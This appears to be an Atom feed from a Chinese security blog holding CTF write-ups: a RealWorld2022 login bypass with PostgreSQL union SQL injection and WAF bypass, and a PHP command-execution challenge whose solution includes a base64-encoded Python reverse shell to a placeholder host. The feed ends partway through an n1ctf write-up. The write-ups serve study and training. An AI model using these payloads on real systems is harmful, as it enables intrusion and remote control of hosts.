class="line"><span class="comment">-----------------------------245630263842877629631739221392--</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20220127/5yEgWc5UBip3.png?imageslim" alt="mark"></p><p><strong>end：</strong></p><p>end：访问服务器资源时，会调用ExtFilterDefine定义的gzip对响应流进行处理，并加载恶意so，执行代码</p><p><img src="http://pic.c1imber.top/blog/20220127/vd1VTEuHIhn8.png?imageslim" alt="mark"></p><p>获取flag:</p><p><img src="http://pic.c1imber.top/blog/20220127/0u6lYaOq79Y4.png?imageslim" alt="mark"></p><p><code>rwctf{cd81450983c06bcb4438dfb8de45ec04}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;RealWorld2022-RWDN复现总结&quot;&gt;&lt;a href=&quot;#RealWorld2022-RWDN复现总结&quot; class=&quot;headerlink&quot; title=&quot;RealWorld2022 RWDN复现总结&quot;&gt;&lt;/a&gt;RealWorld2022 RWDN复现
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>RealWorld2022-Hack into Skynet</title>
    <link href="https://c1aysec.github.io/2022/01/24/RealWorld2022-Hack%20into%20Skynet/"/>
    <id>https://c1aysec.github.io/2022/01/24/RealWorld2022-Hack into Skynet/</id>
    <published>2022-01-24T06:40:40.620Z</published>
    <updated>2022-02-22T06:02:50.625Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RealWorld2022-Hack-into-Skynet"><a href="#RealWorld2022-Hack-into-Skynet" class="headerlink" title="RealWorld2022-Hack into Skynet"></a>RealWorld2022-Hack into Skynet</h1><h3 id="bypass登录逻辑"><a href="#bypass登录逻辑" class="headerlink" title="bypass登录逻辑"></a>bypass登录逻辑</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">query_login_attempt</span><span class="params">()</span>:</span></div><div class="line">    username = flask.request.form.get(<span class="string">'username'</span>, <span class="string">''</span>)</div><div class="line">    password = flask.request.form.get(<span class="string">'password'</span>, <span class="string">''</span>)</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">and</span> <span class="keyword">not</span> password:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line">    sql = (<span class="string">"SELECT id, account"</span></div><div class="line">           <span class="string">"  FROM target_credentials"</span></div><div class="line">           <span class="string">"  WHERE password = '&#123;&#125;'"</span>).format(hashlib.md5(password.encode()).hexdigest())</div><div class="line">    user = sql_exec(sql)</div><div class="line">    name = user[<span class="number">0</span>][<span class="number">1</span>] <span class="keyword">if</span> user <span class="keyword">and</span> user[<span class="number">0</span>] <span class="keyword">and</span> user[<span class="number">0</span>][<span class="number">1</span>] <span class="keyword">else</span> <span class="string">''</span></div><div class="line">    <span class="keyword">return</span> name == username</div></pre></td></tr></table></figure><p>注意这里是and，所以当username为空password不为空时不会返回False，最终可以保证name == username返回True</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">POST /login HTTP/<span class="number">1.1</span></div><div class="line">Host: <span class="number">47.242</span><span class="number">.21</span><span class="number">.212</span>:<span class="number">8081</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">74.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">74.0</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*/*;q=<span class="number">0.8</span></div><div class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: <span class="number">22</span></div><div class="line">Origin: http://<span class="number">47.242</span><span class="number">.21</span><span class="number">.212</span>:<span class="number">8081</span></div><div class="line">Connection: close</div><div class="line">Referer: http://<span class="number">47.242</span><span class="number">.21</span><span class="number">.212</span>:<span class="number">8081</span>/login</div><div class="line">Upgrade-Insecure-Requests: <span class="number">1</span></div><div class="line"></div><div class="line">username[]=&amp;password=<span class="number">1</span></div></pre></td></tr></table></figure><p>获取SessionId（当时传的是数组，其实按照代码的逻辑，username为空也可以，最终<code>flask.request.form.get(&#39;username&#39;, &#39;&#39;)</code>接收到的都是空字符串</p><p><img src="http://pic.c1imber.top/blog/20220124/DfJeyj6R5FEN.png?imageslim" alt="mark"></p><h3 id="需要登录权限的注入"><a href="#需要登录权限的注入" class="headerlink" title="需要登录权限的注入"></a>需要登录权限的注入</h3><p>这里没有用格式化字符串拼接SQL，而是用了format直接拼接SQL，导致SQL注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">query_kill_time</span><span class="params">()</span>:</span></div><div class="line">    name = flask.request.form.get(<span class="string">'name'</span>, <span class="string">''</span>)</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> name:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line"></div><div class="line">    sql = (<span class="string">"SELECT name, born"</span></div><div class="line">           <span class="string">"  FROM target"</span></div><div class="line">           <span class="string">"  WHERE age &gt; 0"</span></div><div class="line">           <span class="string">"    AND name = '&#123;&#125;'"</span>).format(name)</div><div class="line">    nb = sql_exec(sql)</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> nb:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'&#123;&#125;: &#123;&#125;'</span>.format(*nb[<span class="number">0</span>])</div></pre></td></tr></table></figure><p>但是有waf，需要黑盒绕过这里的<code>skynet_detect</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_query</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> skynet_detect():</div><div class="line">        <span class="keyword">return</span> flask.abort(<span class="number">403</span>)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> query_login_state():</div><div class="line">        response = flask.make_response(<span class="string">'No login, redirecting'</span>, <span class="number">302</span>)</div><div class="line">        response.location = flask.escape(<span class="string">'/login'</span>)</div><div class="line">        <span class="keyword">return</span> response</div><div class="line"></div><div class="line">    <span class="keyword">if</span> flask.request.method == <span class="string">'GET'</span>:</div><div class="line">        <span class="keyword">return</span> flask.send_from_directory(<span class="string">''</span>, <span class="string">'index.html'</span>)</div><div class="line">    <span class="keyword">elif</span> flask.request.method == <span class="string">'POST'</span>:</div><div class="line">        kt = query_kill_time()</div><div class="line">        <span class="keyword">if</span> kt:</div><div class="line">            result = kt </div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            result = <span class="string">''</span></div><div class="line">        <span class="keyword">return</span> flask.render_template(<span class="string">'index.html'</span>, result=result)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> flask.abort(<span class="number">400</span>)</div></pre></td></tr></table></figure><p>黑盒测试bypass waf<br>修改POST传输方式，将application/x-www-form-urlencoded改为multipart/form-data方式传输,可过<br>postgresql手注获取flag：</p><p>查表名：(也可以直接从information_schema.tables查询table_name获取)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">POST / HTTP/1.1</div><div class="line">Host: 47.242.21.212:8081</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Cookie: SessionId=2587ff27ad30ebbb69044cf6ac6f67f6; Path=/</div><div class="line">Origin: http://47.242.21.212:8081</div><div class="line">Connection: close</div><div class="line">Referer: http://47.242.21.212:8081/login</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Type: multipart/form-data; boundary=--------1047903036</div><div class="line">Content-Length: 160</div><div class="line"></div><div class="line">----------1047903036</div><div class="line">Content-Disposition: form-data; name=&quot;name&quot;</div><div class="line"></div><div class="line">1&apos; union select &apos;1&apos;,tablename from pg_tables limit 1 offset 0-- -</div><div class="line">----------1047903036--</div></pre></td></tr></table></figure><p>查列名：(也可以直接从information_schema.columns查询column_name获取)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">POST / HTTP/1.1</div><div class="line">Host: 47.242.21.212:8081</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Cookie: SessionId=2587ff27ad30ebbb69044cf6ac6f67f6; Path=/</div><div class="line">Origin: http://47.242.21.212:8081</div><div class="line">Connection: close</div><div class="line">Referer: http://47.242.21.212:8081/login</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Type: multipart/form-data; boundary=--------1047903036</div><div class="line">Content-Length: 333</div><div class="line"></div><div class="line">----------1047903036</div><div class="line">Content-Disposition: form-data; name=&quot;name&quot;</div><div class="line"></div><div class="line">1&apos; union select &apos;1&apos;,attname FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum&gt;0 AND a.relname=&apos;target_credentials&apos; limit 1 offset 1-- -</div><div class="line">----------1047903036--</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20220126/obIxhOF1JGXX.png?imageslim" alt="mark"></p><p>获取flag:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">POST / HTTP/<span class="number">1.1</span></div><div class="line">Host: <span class="number">47.242</span><span class="number">.21</span><span class="number">.212</span>:<span class="number">8081</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">74.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">74.0</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*/*;q=<span class="number">0.8</span></div><div class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Cookie: SessionId=<span class="number">2587</span>ff27ad30ebbb69044cf6ac6f67f6; Path=/</div><div class="line">Origin: http://<span class="number">47.242</span><span class="number">.21</span><span class="number">.212</span>:<span class="number">8081</span></div><div class="line">Connection: close</div><div class="line">Referer: http://<span class="number">47.242</span><span class="number">.21</span><span class="number">.212</span>:<span class="number">8081</span>/login</div><div class="line">Upgrade-Insecure-Requests: <span class="number">1</span></div><div class="line">Content-Type: multipart/form-data; boundary=-------<span class="number">-1047903036</span></div><div class="line">Content-Length: <span class="number">170</span></div><div class="line"></div><div class="line">---------<span class="number">-1047903036</span></div><div class="line">Content-Disposition: form-data; name=<span class="string">"name"</span></div><div class="line"></div><div class="line"><span class="number">1</span><span class="string">' union select '</span><span class="number">1</span><span class="string">',secret_key from target_credentials limit 1 offset 1-- -</span></div><div class="line"><span class="string">----------1047903036--</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20220124/D9o5FruN6Xyj.png?imageslim" alt="mark"></p><p><code>rwctf{t0-h4ck-$kynet-0r-f1ask_that-Is-th3-questi0n}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;RealWorld2022-Hack-into-Skynet&quot;&gt;&lt;a href=&quot;#RealWorld2022-Hack-into-Skynet&quot; class=&quot;headerlink&quot; title=&quot;RealWorld2022-Hack into Skynet&quot;&gt;
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ctf记录记一次简单的命令执行绕过</title>
    <link href="https://c1aysec.github.io/2021/12/30/ctf%E8%AE%B0%E5%BD%95%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/"/>
    <id>https://c1aysec.github.io/2021/12/30/ctf记录记一次简单的命令执行绕过/</id>
    <published>2021-12-30T03:33:39.972Z</published>
    <updated>2021-12-30T03:39:56.716Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctf记录记一次简单的命令执行绕过"><a href="#ctf记录记一次简单的命令执行绕过" class="headerlink" title="ctf记录记一次简单的命令执行绕过"></a>ctf记录记一次简单的命令执行绕过</h1><p>环境没了，直接贴代码吧，最近帮人看的一道题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">highlight_file(<span class="keyword">__FILE__</span>);</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Protect</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $id;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($protect=unserialize($_GET[<span class="string">"bypass"</span>]))&#123;</div><div class="line">    $id[++$protect-&gt;id]=<span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span>($id[]=<span class="number">1</span>)&#123;</div><div class="line">        $protect-&gt;id+=<span class="number">1</span>;</div><div class="line">        <span class="keyword">echo</span> $protect-&gt;id;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"success!"</span>;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"shell"</span>])) &#123;</div><div class="line">            $command = base64_decode($_POST[<span class="string">'shell'</span>]);</div><div class="line">    </div><div class="line">            $whitelists = str_split(<span class="string">'&lt;$ &#123;&#125;\\#()\'0'</span>); </div><div class="line">            $cmd_char_list = str_split($command);</div><div class="line">    </div><div class="line">            <span class="keyword">foreach</span>($cmd_char_list <span class="keyword">as</span> $c)&#123;</div><div class="line">                <span class="keyword">if</span>(in_array($c, $whitelists))&#123;</div><div class="line">                    system($command);</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    <span class="keyword">die</span>(<span class="string">"No, No way!"</span>);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">    </div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">"Try hard!"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span> <span class="keyword">Try</span> hard!</div></pre></td></tr></table></figure><p>有2处考点：</p><p>1、需要进入else分支执行system，可以通过整型溢出进行绕过</p><p>2、需要执行system，首先要绕过这里的过滤</p><p>注意看这个循环：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">foreach</span>($cmd_char_list <span class="keyword">as</span> $c)&#123;</div><div class="line">    <span class="keyword">if</span>(in_array($c, $whitelists))&#123;</div><div class="line">        system($command);</div><div class="line">    &#125;</div></pre></td></tr></table></figure><p>如果第一个字符在白名单当中，就可以执行命令</p><p>方法：</p><p>1、反弹shell:</p><p>这里可以通过传入<code>$(command)</code>进行执行,在linux当中，<code>$()</code>具有执行命令的作用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /<span class="number">333.</span>php?bypass=O%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>Protect%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">22</span>id%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A9223372036854775806%<span class="number">3</span>B%<span class="number">7</span>D HTTP/<span class="number">1.1</span></div><div class="line">Host: xxxx</div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">74.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">74.0</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></div><div class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></div><div class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></div><div class="line"><span class="comment">Connection: close</span></div><div class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></div><div class="line"><span class="comment">Cache-Control: max-age=0</span></div><div class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></div><div class="line"><span class="comment">Content-Length: 318</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">shell=JChweXRob24gLWMgJ2ltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcztzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCJ4eHh4Iiw4ODg4KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsnKQ==</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211230/II5dcmrtQq2E.png?imageslim" alt="mark"></p><p>2、不出网回显执行</p><p><code>\&lt;||id</code></p><p>&lt;的作用是使前面的命令出错</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /<span class="number">333.</span>php?bypass=O%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>Protect%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">22</span>id%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A9223372036854775806%<span class="number">3</span>B%<span class="number">7</span>D HTTP/<span class="number">1.1</span></div><div class="line">Host: xxxx</div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">74.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">74.0</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></div><div class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></div><div class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></div><div class="line"><span class="comment">Connection: close</span></div><div class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></div><div class="line"><span class="comment">Cache-Control: max-age=0</span></div><div class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></div><div class="line"><span class="comment">Content-Length: 14</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">shell=XDx8fGlk</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211230/jaJMuaTD8wLD.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ctf记录记一次简单的命令执行绕过&quot;&gt;&lt;a href=&quot;#ctf记录记一次简单的命令执行绕过&quot; class=&quot;headerlink&quot; title=&quot;ctf记录记一次简单的命令执行绕过&quot;&gt;&lt;/a&gt;ctf记录记一次简单的命令执行绕过&lt;/h1&gt;&lt;p&gt;环境没了，直接贴代码
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2021 n1ctf 复盘</title>
    <link href="https://c1aysec.github.io/2021/11/23/2021%20n1ctf%20%E5%A4%8D%E7%9B%98/"/>
    <id>https://c1aysec.github.io/2021/11/23/2021 n1ctf 复盘/</id>
    <published>2021-11-23T02:08:49.661Z</published>
    <updated>2021-11-26T16:32:22.701Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2021-n1ctf-复盘"><a href="#2021-n1ctf-复盘" class="headerlink" title="2021 n1ctf 复盘"></a>2021 n1ctf 复盘</h1><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p>web题只做出了签到，哭了</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="comment">//flag is /flag</span></div><div class="line">$path=$_POST[<span class="string">'path'</span>];</div><div class="line">$time=(<span class="keyword">isset</span>($_GET[<span class="string">'time'</span>])) ? urldecode(date(file_get_contents(<span class="string">'php://input'</span>))) : date(<span class="string">"Y/m/d H:i:s"</span>);</div><div class="line">$name=<span class="string">"/var/www/tmp/"</span>.time().rand().<span class="string">'.txt'</span>;</div><div class="line">$black=<span class="string">"f|ht|ba|z|ro|;|,|=|c|g|da|_"</span>;</div><div class="line">$blist=explode(<span class="string">"|"</span>,$black);</div><div class="line"><span class="keyword">foreach</span>($blist <span class="keyword">as</span> $b)&#123;</div><div class="line">    <span class="keyword">if</span>(strpos($path,$b) !== <span class="keyword">false</span>)&#123;</div><div class="line">        <span class="keyword">die</span>();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(file_put_contents($name, $time))&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre class='language-html'&gt;&lt;code class='language-html'&gt;logpath:$name&lt;/code&gt;&lt;/pre&gt;"</span>;</div><div class="line">&#125;</div><div class="line">$check=preg_replace(<span class="string">'/((\s)*(\n)+(\s)*)/i'</span>,<span class="string">''</span>,file_get_contents($path));</div><div class="line"><span class="keyword">if</span>(is_file($check))&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre class='language-html'&gt;&lt;code class='language-html'&gt;"</span>.file_get_contents($check).<span class="string">"&lt;/code&gt;&lt;/pre&gt;"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>代码很简单，就是接收<code>php://input</code>的内容，经过urldecode(date(file_get_contents(‘php://input’)))处理后写入文件，然后获取写入后文件的内容，如果获取到的内容是一个存在的文件，则读取输出</p><p>但是date函数会对一些字符进行格式化，翻阅php官方文档可以看到字符有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">format 字符说明返回值例子</div><div class="line">日------</div><div class="line">d月份中的第几天，有前导零的 <span class="number">2</span> 位数字<span class="number">01</span> 到 <span class="number">31</span></div><div class="line">D星期中的第几天，文本表示，<span class="number">3</span> 个字母Mon 到 Sun</div><div class="line">j月份中的第几天，没有前导零<span class="number">1</span> 到 <span class="number">31</span></div><div class="line">l（“L”的小写字母）星期几，完整的文本格式Sunday 到 Saturday</div><div class="line">NISO<span class="number">-8601</span> 格式数字表示的星期中的第几天（PHP <span class="number">5.1</span><span class="number">.0</span> 新加）<span class="number">1</span>（表示星期一）到 <span class="number">7</span>（表示星期天）</div><div class="line">S每月天数后面的英文后缀，<span class="number">2</span> 个字符st，nd，rd 或者 th。可以和 j 一起用</div><div class="line">w星期中的第几天，数字表示<span class="number">0</span>（表示星期天）到 <span class="number">6</span>（表示星期六）</div><div class="line">z年份中的第几天<span class="number">0</span> 到 <span class="number">365</span></div><div class="line">星期------</div><div class="line">WISO<span class="number">-8601</span> 格式年份中的第几周，每周从星期一开始（PHP <span class="number">4.1</span><span class="number">.0</span> 新加的）例如：<span class="number">42</span>（当年的第 <span class="number">42</span> 周）</div><div class="line">月------</div><div class="line">F月份，完整的文本格式，例如 January 或者 MarchJanuary 到 December</div><div class="line">m数字表示的月份，有前导零<span class="number">01</span> 到 <span class="number">12</span></div><div class="line">M三个字母缩写表示的月份Jan 到 Dec</div><div class="line">n数字表示的月份，没有前导零<span class="number">1</span> 到 <span 